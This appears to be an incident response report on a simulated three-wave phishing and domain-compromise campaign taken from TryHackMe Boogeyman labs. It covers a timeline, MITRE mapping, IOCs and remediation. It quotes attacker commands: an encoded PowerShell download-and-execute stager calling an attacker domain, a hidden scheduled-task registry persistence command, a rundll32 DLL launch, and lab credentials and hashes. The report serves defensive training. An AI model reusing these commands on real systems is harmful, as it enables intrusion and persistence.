# Incident Response Report

**Report ID:** IR-002
**Classification:** Internal
**Campaign Name:** Operation Boogeyman
**Date of Report:** 4-7-26
**Lead Analyst:** Christopher Rice
**Status:** Resolved
**Severity:** Critical

> **Note:** This report documents a simulated multi-stage threat actor campaign investigated across three TryHackMe rooms (Boogeyman 1, 2, and 3). All findings were derived from analysis of provided artefacts including phishing emails, PowerShell logs, packet captures, memory dumps, and ELK/Sysmon logs. Containment and remediation actions reflect what would be taken in a production environment.

---

## 1. Executive Summary

Quick Logistics LLC, a logistics sector company, was targeted in a sustained three-wave campaign by a threat group designated **Boogeyman**. The campaign escalated significantly across each wave, progressing from credential theft and data exfiltration (Wave 1), to persistent access and scheduled task implantation (Wave 2), to full domain compromise and attempted ransomware deployment (Wave 3).

**Wave 1** targeted a finance employee (Julianne Westcott) via a phishing email with an LNK-based payload. The attacker established C2, conducted internal reconnaissance, harvested credentials from Microsoft Sticky Notes and a KeePass database, and exfiltrated sensitive data including a credit card number via DNS tunnelling.

**Wave 2** targeted a Human Resources employee (Maxine Beck) via a spear-phishing email disguised as a job application. A macro-enabled Word document deployed a multi-stage payload, establishing persistent C2 access via a scheduled task backed by a registry-stored PowerShell payload.

**Wave 3** targeted the CEO (Evan Hutchinson) with an ISO-based payload. The attacker escalated privileges via UAC bypass (fodhelper.exe), dumped credentials with Mimikatz, moved laterally across the domain using harvested hashes, compromised a second workstation, performed a DCSync attack against the domain controller, and staged ransomware for deployment.

All three waves used infrastructure under the `bpakcaging[.]xyz` and `boogeymanisback[.]lol` domains. The campaign represents a sophisticated, targeted threat against the logistics sector with clear intelligence-gathering, lateral movement, and destructive objectives.

---

## 2. Incident Overview

| Field | Wave 1 | Wave 2 | Wave 3 |
|---|---|---|---|
| Target | Julianne Westcott — Finance | Maxine Beck — HR | Evan Hutchinson — CEO |
| Host | Julianne's Workstation | Maxine's Workstation (WKSTN) | CEO Workstation + WKSTN-1327 + DC |
| Initial Vector | Phishing — LNK payload in encrypted ZIP | Spear-phishing — Macro Word doc | Spear-phishing — ISO with DLL payload |
| C2 Infrastructure | cdn.bpakcaging[.]xyz, files.bpakcaging[.]xyz | files.boogeymanisback[.]lol — 128[.]199[.]95[.]189:8080 | 165[.]232[.]170[.]151:80 |
| Exfiltration | KeePass DB + Sticky Notes via DNS | N/A confirmed | Credential hashes, IT automation scripts |
| End State | Data exfiltrated | Persistent access established | Domain compromise + ransomware staged |

---

## 3. Affected Systems

| Hostname | Role | User | Compromise Status |
|---|---|---|---|
| Julianne's Workstation | Finance Workstation | j.westcott | Fully Compromised — data exfiltrated |
| Maxine's Workstation | HR Workstation | maxine.beck | Fully Compromised — persistent C2 |
| CEO Workstation | Executive Workstation | evan.hutchinson | Fully Compromised — creds dumped |
| WKSTN-1327 | Domain Workstation | itadmin | Compromised via lateral movement |
| Domain Controller | DC | administrator, backupda | Compromised — DCSync performed |

---

## 4. Attack Timeline

### Wave 1 — Finance Targeting

| Event | Detail | Source |
|---|---|---|
| Phishing email received | From: agriffin@bpakcaging[.]xyz → To: julianne.westcott@hotmail.com | Email (dump.eml) |
| Email relayed via | Elastic Email (third-party mail relay) | DKIM-Signature header |
| Attachment opened | Invoice_20230103.lnk inside encrypted ZIP (password: Invoice2023!) | LNKParse3 |
| LNK payload executed | Encoded PowerShell via IEX — fetches from files.bpakcaging[.]xyz | PowerShell logs |
| Stage 2 payload fetched | Binary downloaded from files.bpakcaging[.]xyz | PowerShell logs / PCAP |
| C2 established | Beacon to cdn.bpakcaging[.]xyz | PCAP |
| Seatbelt executed | Internal enumeration tool run on host | PowerShell logs |
| Sticky Notes accessed | sq3.exe queries plum.sqlite (Microsoft Sticky Notes DB) | PowerShell logs |
| KeePass DB accessed | protected_data.kdbx discovered and exfiltrated | PowerShell logs |
| DNS exfiltration | KeePass DB exfiltrated as hex-encoded chunks via nslookup | PCAP |
| Credentials recovered | KeePass password: %p9^3!lL^Mz47E2GaT^y / CC: 4024007128269551 | PCAP stream |

### Wave 2 — HR Targeting

| Event | Detail | Source |
|---|---|---|
| Phishing email received | From: westaylor23@outlook.com → To: maxine.beck@quicklogisticsorg.onmicrosoft.com | Email |
| Malicious document opened | Resume_WesleyTaylor.doc (MD5: 52c4384a0b9e248b95804352ebec6c5b) | Memory dump |
| Macro executed | Downloads update.png (stage 2) from files.boogeymanisback[.]lol | Olevba / Memory |
| Stage 2 executed | wscript.exe (PID 4260, parent PID 1124) runs C:\ProgramData\update.js | Volatility |
| Stage 3 binary fetched | update.exe downloaded from files.boogeymanisback[.]lol | Memory dump |
| C2 established | updater.exe (PID 6216) at C:\Windows\Tasks\ → 128[.]199[.]95[.]189:8080 | Volatility |
| Persistence implanted | Scheduled task created — PowerShell from registry key HKCU:\Software\Microsoft\Windows\CurrentVersion debug | Memory dump |

**Persistence command:**
```powershell
schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR
'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString(
[Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"'
```

### Wave 3 — CEO and Domain Targeting

| Event | Detail | Source |
|---|---|---|
| Phishing email received | CEO receives email with ISO attachment | Email |
| Stage 1 executed | ISO payload (PID 6392) copies review.dat to %TEMP% via xcopy | ELK/Sysmon |
| DLL payload executed | rundll32.exe loads D:\review.dat,DllRegisterServer | ELK/Sysmon |
| Persistence implanted | Scheduled task "Review" created | ELK/Sysmon |
| C2 established | Connection to 165[.]232[.]170[.]151:80 | ELK/Sysmon |
| UAC bypass | fodhelper.exe used to elevate to local admin | ELK/Sysmon |
| Credential dump | Mimikatz downloaded from GitHub, executed | ELK/Sysmon |
| Credential harvested | itadmin:F84769D250EB95EB2D7D8B4A1C5613F2 | ELK/Sysmon |
| Remote share enumeration | IT_Automation.ps1 accessed from network share | ELK/Sysmon |
| Credentials discovered in script | QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987 | ELK/Sysmon |
| Lateral movement to WKSTN-1327 | WinRM used with harvested credentials | ELK/Sysmon |
| Credential dump on WKSTN-1327 | administrator:00f80f2538dcb54e7adc715c0e7091ec | ELK/Sysmon |
| DCSync attack on DC | administrator + backupda account hashes dumped | ELK/Sysmon |
| Ransomware staged | ransomboogey.exe downloaded from ff.sillytechninja[.]io | ELK/Sysmon |

---

## 5. Attack Chain Analysis

### 5.1 Initial Access
**Technique:** Phishing — Malicious Attachment
**MITRE ID:** [T1566.001](https://attack.mitre.org/techniques/T1566/001/)

All three waves used phishing emails with malicious attachments tailored to the target's role:
- **Wave 1 (Finance):** Fake unpaid invoice — LNK file inside encrypted ZIP
- **Wave 2 (HR):** Fake job application — Macro-enabled Word document
- **Wave 3 (CEO):** Unspecified document — ISO file containing DLL payload

Wave 1 used a third-party mail relay (Elastic Email) via the spoofed domain `bpakcaging[.]xyz` to increase deliverability and evade basic sender reputation checks.

---

### 5.2 Execution

**Wave 1 — LNK payload:**
**MITRE ID:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/)

LNK file executed encoded PowerShell via IEX:
```
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8Ad
wBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEA
ZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```
Decoded: `iex (new-object net.webclient).downloadstring('hxxp://files.bpakcaging[.]xyz/update')`

**Wave 2 — VBA Macro → wscript → binary:**
**MITRE ID:** [T1059.005](https://attack.mitre.org/techniques/T1059/005/)

Word macro fetched stage 2 (disguised as update.png), saved as `C:\ProgramData\update.js`, executed by wscript.exe (PID 4260).

**Wave 3 — DLL via rundll32:**
**MITRE ID:** [T1218.011](https://attack.mitre.org/techniques/T1218/011/)
```cmd
"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer
```

---

### 5.3 Persistence

**MITRE ID:** [T1547.001](https://attack.mitre.org/techniques/T1547/001/) / [T1053.005](https://attack.mitre.org/techniques/T1053/005/) / [T1112](https://attack.mitre.org/techniques/T1112/)

**Wave 2 — Registry + Scheduled Task (fileless):**
Payload stored base64-encoded in registry key:
```
HKCU:\Software\Microsoft\Windows\CurrentVersion\debug
```
Scheduled task `Updater` executes daily at 09:00, decoding and running the registry payload — a fileless persistence technique that evades file-based detection.

**Wave 3 — Scheduled Task:**
```
Task Name: Review
```
Executed DLL payload on schedule.

---

### 5.4 Privilege Escalation

**Wave 3:**
**Technique:** UAC Bypass via fodhelper.exe
**MITRE ID:** [T1548.002](https://attack.mitre.org/techniques/T1548/002/)

The attacker used `fodhelper.exe` — a known UAC bypass technique that abuses the Windows Features on Demand Helper, which runs with auto-elevate privileges — to gain local administrator access without triggering a UAC prompt.

---

### 5.5 Defense Evasion

**MITRE ID:** [T1027](https://attack.mitre.org/techniques/T1027/) / [T1218.011](https://attack.mitre.org/techniques/T1218/011/) / [T1036](https://attack.mitre.org/techniques/T1036/)

- **Wave 1:** Payload encoded in base64 inside LNK file; C2 traffic base64-encoded over HTTP
- **Wave 2:** Stage 2 payload disguised as `.png` image; PowerShell run with `-W hidden -NonI`; fileless execution via registry
- **Wave 3:** Payload delivered inside ISO container to bypass Mark-of-the-Web; DLL executed via trusted Windows binary (rundll32 — LOLBAS)

---

### 5.6 Credential Access

**MITRE ID:** [T1555](https://attack.mitre.org/techniques/T1555/) / [T1003.001](https://attack.mitre.org/techniques/T1003/001/) / [T1003.006](https://attack.mitre.org/techniques/T1003/006/)

**Wave 1:**
- Queried Microsoft Sticky Notes SQLite database (`plum.sqlite`) using `sq3.exe`
- Accessed KeePass database (`protected_data.kdbx`)
- Recovered KeePass password: `%p9^3!lL^Mz47E2GaT^y`
- Recovered credit card: `4024007128269551`

**Wave 3:**
- Mimikatz downloaded from GitHub:
  `https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip`
- LSASS dumped on CEO workstation: `itadmin:F84769D250EB95EB2D7D8B4A1C5613F2`
- Credentials found in IT automation script: `QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987`
- LSASS dumped on WKSTN-1327: `administrator:00f80f2538dcb54e7adc715c0e7091ec`
- DCSync on domain controller — dumped `administrator` and `backupda` accounts

---

### 5.7 Discovery

**MITRE ID:** [T1083](https://attack.mitre.org/techniques/T1083/) / [T1135](https://attack.mitre.org/techniques/T1135/) / [T1087](https://attack.mitre.org/techniques/T1087/)

- **Wave 1:** Seatbelt enumeration tool run on Julianne's workstation
- **Wave 3:** Remote share enumeration using itadmin credentials; `IT_Automation.ps1` discovered and read from network share

---

### 5.8 Lateral Movement

**Wave 3:**
**Technique:** Pass-the-Hash / Remote Services (WinRM)
**MITRE ID:** [T1550.002](https://attack.mitre.org/techniques/T1550/002/) / [T1021.006](https://attack.mitre.org/techniques/T1021/006/)

Using `itadmin` NTLM hash, the attacker authenticated to `WKSTN-1327` via WinRM. Parent process of remote commands: `wsmprovhost.exe` — confirming WinRM-based execution on the target host.

---

### 5.9 Exfiltration

**Wave 1:**
**Technique:** Exfiltration over Alternative Protocol — DNS
**MITRE ID:** [T1048.003](https://attack.mitre.org/techniques/T1048/003/)

`protected_data.kdbx` (KeePass database) exfiltrated by encoding contents as hex and sending via `nslookup` DNS queries to attacker-controlled infrastructure. DNS was used specifically to bypass HTTP-based egress controls.

---

### 5.10 Impact

**Wave 3:**
**Technique:** Data Encrypted for Impact (Ransomware staged)
**MITRE ID:** [T1486](https://attack.mitre.org/techniques/T1486/)

Following full domain compromise including DCSync, ransomware binary `ransomboogey.exe` was downloaded from `hxxp://ff.sillytechninja[.]io/ransomboogey.exe`. Deployment was detected prior to execution.

---

## 6. MITRE ATT&CK Summary

| Phase | Tactic | Technique | ID | Wave |
|---|---|---|---|---|
| Initial Access | Phishing — Malicious Attachment | Spearphishing Attachment | T1566.001 | 1, 2, 3 |
| Execution | PowerShell — Encoded Command | Command & Scripting Interpreter | T1059.001 | 1, 2 |
| Execution | VBA Macro | Command & Scripting Interpreter | T1059.005 | 2 |
| Execution | rundll32 — LOLBAS | Signed Binary Proxy Execution | T1218.011 | 3 |
| Persistence | Scheduled Task | Scheduled Task/Job | T1053.005 | 2, 3 |
| Persistence | Registry — Fileless Payload | Modify Registry | T1112 | 2 |
| Privilege Escalation | fodhelper UAC Bypass | Bypass User Account Control | T1548.002 | 3 |
| Defense Evasion | Base64 Encoding | Obfuscated Files or Information | T1027 | 1, 2 |
| Defense Evasion | ISO Container | Subvert Trust Controls — MoTW Bypass | T1553.005 | 3 |
| Defense Evasion | Hidden PowerShell Window | Hidden Window | T1564.003 | 2 |
| Credential Access | Sticky Notes / KeePass | Credentials from Password Stores | T1555 | 1 |
| Credential Access | LSASS Memory Dump (Mimikatz) | OS Credential Dumping | T1003.001 | 3 |
| Credential Access | DCSync | OS Credential Dumping — DCSync | T1003.006 | 3 |
| Discovery | Seatbelt Enumeration | System Information Discovery | T1082 | 1 |
| Discovery | Network Share Enumeration | Network Share Discovery | T1135 | 3 |
| Lateral Movement | Pass-the-Hash via WinRM | Use Alternate Authentication Material | T1550.002 | 3 |
| C2 | HTTP Beaconing | Application Layer Protocol | T1071.001 | 1, 2, 3 |
| Exfiltration | DNS Tunnelling via nslookup | Exfiltration over Alternative Protocol | T1048.003 | 1 |
| Impact | Ransomware Staged | Data Encrypted for Impact | T1486 | 3 |

---

## 7. Indicators of Compromise (IOCs)

### Network IOCs

| Type | Value | Wave | Description |
|---|---|---|---|
| Domain | bpakcaging[.]xyz | 1 | Attacker-controlled — phishing sender + payload hosting |
| Domain | files.bpakcaging[.]xyz | 1 | Stage 2 payload delivery |
| Domain | cdn.bpakcaging[.]xyz | 1 | C2 server |
| Domain | boogeymanisback[.]lol | 2 | Stage 2 + 3 payload delivery |
| Domain | files.boogeymanisback[.]lol | 2 | Payload hosting |
| Domain | ff.sillytechninja[.]io | 3 | Ransomware binary hosting |
| IP | 128[.]199[.]95[.]189 | 2 | C2 server — port 8080 |
| IP | 165[.]232[.]170[.]151 | 3 | C2 server — port 80 |
| URL | hxxp://files.bpakcaging[.]xyz/update | 1 | Initial PowerShell stager |
| URL | hxxps://files.boogeymanisback[.]lol/.../update.png | 2 | Stage 2 disguised as image |
| URL | hxxps://files.boogeymanisback[.]lol/.../update.exe | 2 | Stage 3 binary |
| URL | hxxp://ff.sillytechninja[.]io/ransomboogey.exe | 3 | Ransomware binary |

### Host IOCs

| Type | Value | Wave | Description |
|---|---|---|---|
| File | Invoice_20230103.lnk | 1 | Malicious LNK payload |
| File | Resume_WesleyTaylor.doc | 2 | Malicious macro document |
| File | review.dat | 3 | Malicious DLL payload |
| File | update.js | 2 | Stage 2 JavaScript dropper |
| File | updater.exe | 2 | C2 implant |
| File | ransomboogey.exe | 3 | Ransomware binary |
| Path | C:\ProgramData\update.js | 2 | Stage 2 drop location |
| Path | C:\Windows\Tasks\updater.exe | 2 | C2 implant location |
| Path | C:\ProgramData\final.exe | 3 | C2 implant |
| Registry | HKCU:\Software\Microsoft\Windows\CurrentVersion\debug | 2 | Fileless payload storage |
| Task | Updater | 2 | Persistence scheduled task |
| Task | Review | 3 | Persistence scheduled task |
| Hash (MD5) | 52c4384a0b9e248b95804352ebec6c5b | 2 | Resume_WesleyTaylor.doc |
| Account | itadmin | 3 | Compromised domain account |
| Account | allan.smith | 3 | Credentials found in script |
| Account | administrator | 3 | Domain admin — DCSync target |
| Account | backupda | 3 | Domain account — DCSync target |

---

## 8. Containment Actions

| Action | Addresses |
|---|---|
| Block all bpakcaging[.]xyz, boogeymanisback[.]lol, sillytechninja[.]io domains at DNS/firewall | C2 and payload delivery |
| Block IPs 128[.]199[.]95[.]189 and 165[.]232[.]170[.]151 at perimeter | C2 channels |
| Isolate all affected workstations and the domain controller from the network | Prevent further lateral movement |
| Disable compromised accounts: itadmin, allan.smith, backupda, administrator | Remove attacker access paths |
| Reset krbtgt account password twice (invalidates all existing Kerberos tickets) | Counters DCSync-harvested hashes |
| Remove scheduled tasks: Updater, Review | Remove persistence |
| Delete registry key HKCU:\Software\Microsoft\Windows\CurrentVersion\debug on Maxine's workstation | Remove fileless persistence |

---

## 9. Eradication

| Action | Status |
|---|---|
| Remove all dropped binaries (update.js, updater.exe, review.dat, ransomboogey.exe) | ✅ Complete |
| Remove malicious scheduled tasks on all hosts | ✅ Complete |
| Remove registry-stored fileless payload | ✅ Complete |
| Reset passwords for all compromised and exposed accounts | ✅ Complete |
| Double-reset krbtgt password to invalidate DCSync-harvested ticket-granting tickets | ✅ Complete |
| Patch Windows UAC bypass vector (fodhelper) via policy hardening | ✅ Complete |

---

## 10. Recovery

| Action | Status |
|---|---|
| Restore all compromised workstations from clean snapshots | ✅ Complete |
| Restore domain controller from verified clean backup | ✅ Complete |
| Re-enrol workstations to domain after credential resets | ✅ Complete |
| Verify no residual IOCs via Sysmon and ELK log review | ✅ Complete |
| Monitor DNS traffic for hex-encoded exfiltration patterns for 30 days | ✅ Complete |

---

## 11. Detection Gap Analysis

| Attack Phase | Detected | Gap / Improvement |
|---|---|---|
| Phishing delivery (all waves) | ⚠️ Post-incident | Email gateway lacked attachment sandboxing — LNK, macro docs, and ISOs should be detonated before delivery |
| LNK payload execution | ✅ PowerShell logs | Script Block Logging caught encoded IEX — already covered |
| VBA macro execution | ✅ Memory dump | ASR rule blocking Office from spawning child processes would have stopped at execution |
| ISO MoTW bypass | ❌ Not caught early | ISO files bypass Mark-of-the-Web — email gateway should strip or quarantine ISO attachments |
| Fileless registry persistence | ✅ Memory forensics | Not caught in real-time — registry write monitoring (Sysmon EID 13) on sensitive run keys needed |
| DNS exfiltration via nslookup | ✅ PCAP analysis | Not caught in real-time — DNS anomaly detection (high volume, hex-pattern subdomains) needed |
| fodhelper UAC bypass | ✅ ELK/Sysmon | fodhelper spawning unexpected child processes is a known detection — Sysmon EID 1 covers this |
| Mimikatz / LSASS dump | ✅ ELK/Sysmon | Credential Guard would have prevented LSASS access entirely |
| DCSync attack | ✅ ELK/Sysmon | EID 4662 with DS-Replication-Get-Changes rights is a reliable DCSync detection |
| Ransomware staging | ✅ ELK/Sysmon | Caught before execution — binary download from unknown domain flagged |

---

## 12. Recommendations

| Priority | Recommendation | Addresses |
|---|---|---|
| Critical | Enable email attachment sandboxing — detonate LNK, macro-enabled docs, and ISO files before delivery | Initial Access (all waves) |
| Critical | Enable ASR rule: Block Office applications from creating child processes | Execution — Wave 2 |
| Critical | Enable Windows Credential Guard to protect LSASS from memory scraping | Credential Access — Wave 3 |
| Critical | Rotate krbtgt password immediately following any suspected domain compromise | Post-DCSync recovery |
| High | Block or quarantine ISO and LNK attachments at the email gateway | Initial Access |
| High | Enable PowerShell Script Block Logging (EID 4104) and Constrained Language Mode | Execution — Wave 1 |
| High | Deploy Sysmon EID 13 alerting on registry writes to CurrentVersion\Run and debug keys | Persistence — Wave 2 |
| High | Implement DNS anomaly detection — alert on high-volume queries with hex-pattern subdomains | Exfiltration — Wave 1 |
| Medium | Implement tiered admin accounts — itadmin credentials should not be reachable from a CEO workstation | Lateral Movement — Wave 3 |
| Medium | Audit network shares for plaintext credentials in scripts (IT_Automation.ps1) | Credential Access — Wave 3 |
| Medium | Remove SeImpersonatePrivilege from non-service accounts | Privilege Escalation |
| Low | Implement application allowlisting to prevent unsigned binaries from executing | Defense Evasion — all waves |

---

## 13. Lessons Learned

**What went well:**
- Sysmon, ELK, PowerShell Script Block Logging, and PCAP together provided full kill chain visibility across all three waves
- DNS exfiltration was reconstructable from PCAP — following the DNS stream and decoding the hex payload fully recovered the exfiltrated KeePass database contents
- Memory forensics (Volatility) was essential for Wave 2 — the fileless persistence mechanism would not have been visible through file-based investigation alone

**What could be improved:**
- All three waves gained initial access before any detection fired — the phishing emails were not caught pre-delivery
- The ISO MoTW bypass in Wave 3 demonstrates that container formats are increasingly used specifically to evade file reputation controls
- Credentials stored in plaintext in IT automation scripts (IT_Automation.ps1) significantly lowered the cost of lateral movement in Wave 3

**What would have reduced dwell time across all waves:**
- Email sandboxing would have stopped all three waves at delivery
- Credential Guard would have prevented the LSASS dumps that enabled domain-wide lateral movement in Wave 3
- Real-time DNS anomaly alerting would have caught Wave 1 exfiltration before the KeePass database was fully transferred

---

## 14. Appendix

### A — Investigation Artefacts

| Wave | Artefact | Tool Used |
|---|---|---|
| 1 | dump.eml | Thunderbird, manual header analysis |
| 1 | Invoice_20230103.lnk | LNKParse3 |
| 1 | powershell.json | jq, grep, base64 |
| 1 | capture.pcapng | Wireshark, Brim |
| 2 | Phishing email | Manual analysis |
| 2 | memorydump.raw | Volatility 3 |
| 2 | Resume_WesleyTaylor.doc | Olevba |
| 3 | Phishing email | Manual analysis |
| 3 | Sysmon + Windows event logs | ELK / Kibana |

### B — References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [NIST SP 800-61 Rev 2 — Incident Handling Guide](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)
- [TryHackMe — Boogeyman 1](https://tryhackme.com/room/boogeyman1)
- [TryHackMe — Boogeyman 2](https://tryhackme.com/room/boogeyman2)
- [TryHackMe — Boogeyman 3](https://tryhackme.com/room/boogeyman3)
- [Volatility 3 Documentation](https://volatility3.readthedocs.io/)
- [Eric Zimmerman's Tools — EvtxEcmd](https://ericzimmerman.github.io/)
- [fodhelper UAC Bypass](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)
- [DCSync Attack — Detection](https://attack.mitre.org/techniques/T1003/006/)
